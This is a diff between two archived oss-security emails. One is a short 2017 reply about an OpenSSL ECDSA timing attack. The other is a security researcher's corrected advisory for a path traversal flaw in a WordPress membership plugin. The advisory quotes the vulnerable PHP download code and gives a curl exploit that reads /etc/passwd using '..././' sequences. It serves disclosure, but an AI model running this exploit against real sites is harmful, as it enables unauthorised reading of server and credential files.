@@ -1,22 +1,60 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/01/10/9
-Message-Id: <6D927636-CDD5-4A48-90F8-3149133ED354@omniti.com>
-Date: Tue, 10 Jan 2017 11:17:45 -0500
-From: Dan McDonald <danmcd@...iti.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/03/15/2
+Message-id: <68EF56AF-248C-4D01-A1E5-DC0AB9FCACBB@me.com>
+Date: Wed, 15 Mar 2017 08:09:01 -0400
+From: "Larry W. Cashdollar" <larry0@...com>
 To: oss-security@...ts.openwall.com
-Cc: Dan McDonald <danmcd@...iti.com>
-Subject: Re: CVE-2016-7056 ECDSA P-256 timing attack key recovery (OpenSSL, LibreSSL, BoringSSL)
+Subject: Re: Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58
 Content-Type: text/plain; charset=utf-8
 
+Sorry Folks,
 
-> On Jan 10, 2017, at 10:50 AM, Cesar Pereida Garcia <cesar.pereidagarcia@....fi> wrote:
+The vulnerability description should have read 'does *not* check':
+
+> Vulnerability:
+> The file download code located membership-simplified-for-oap-members-only/download.php does not check whether a user is logged in and has download privledges, the code on line 5 that checks the path can be defeated by using a ..././ pattern to get the desired ../ after being passed through the str_replace() function:
+
+
+
+> On Mar 14, 2017, at 4:33 PM, Larry W. Cashdollar <larry0@...com> wrote:
 > 
-> Mitigation:
-> Users of OpenSSL with the affected versions should apply
-> the patch available in the manuscript at [1].
-
-You should just mail the patch to this list.  I'm having a hard time copying/pasting the uuencoded blob from your paper, Cesar.
-
-Thanks,
-Dan
+> Title: Arbitrary file download vulnerability in Wordpress Plugin Membership Simplified v1.58
+> Author: Larry W. Cashdollar, @_larry0
+> Date: 2017-03-13
+> CVE-ID:[CVE-2017-1002008]
+> Download Site: https://wordpress.org/plugins/membership-simplified-for-oap-members-only
+> Vendor: https://profiles.wordpress.org/williamdeangelis/
+> Vendor Notified: 2017-03-13
+> Vendor Contact: plugins@...dpress.org
+> Advisory: http://www.vapidlabs.com/advisory.php?v=187
+> Description: Membership Simplified allows you to generate membership lessons with templated content to create a unified look and feel throughout your courses.
+> Vulnerability:
+> The file download code located membership-simplified-for-oap-members-only/download.php does check whether a user is logged in and has download privledges, the code on line 5 that checks the path can be defeated by using a ..././ pattern to get the desired ../ after being passed through the str_replace() function:
+> 
+> 3 $path = substr(getcwd(), 0, -50). "uploads/membership-simplified-for-oap-members-only/"; // change the path to fit your websites document structure
+>  4 $fullPath = $path.$_GET['download_file'];
+>  5 $fullPath = str_replace("../","",$fullPath);
+>  6 
+>  7 if ($fd = fopen($fullPath, "r")) {
+>  8     $fsize = filesize($fullPath);
+>  9     $path_parts = pathinfo($fullPath);
+> 10     $ext = strtolower($path_parts["extension"]);
+> 11     switch ($ext) {
+> 12         case "pdf":
+> 13         header("Content-type: application/pdf"); // add here more headers for d    iff. extensions
+> 14         header("Content-Disposition: attachment; filename=\"".$path_parts["base    name"]."\""); // use 'attachment' to force a download
+> 15         break;
+> 16         default;
+> 17         header("Content-type: application/octet-stream");
+> 18         header("Content-Disposition: filename=\"".$path_parts["basename"]."\"")    ;
+> 19     }
+> 20     header("Content-length: $fsize");
+> 21     header("Cache-control: private"); //use this to open files directly
+> 22     while(!feof($fd)) {
+> 23         $buffer = fread($fd, 2048);
+> 24         echo $buffer;
+> 
+> Exploit Code:
+> 	• $ curl http://example.com/wordpress/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././..././..././..././..././..././etc/passwd
+> 	•  
 
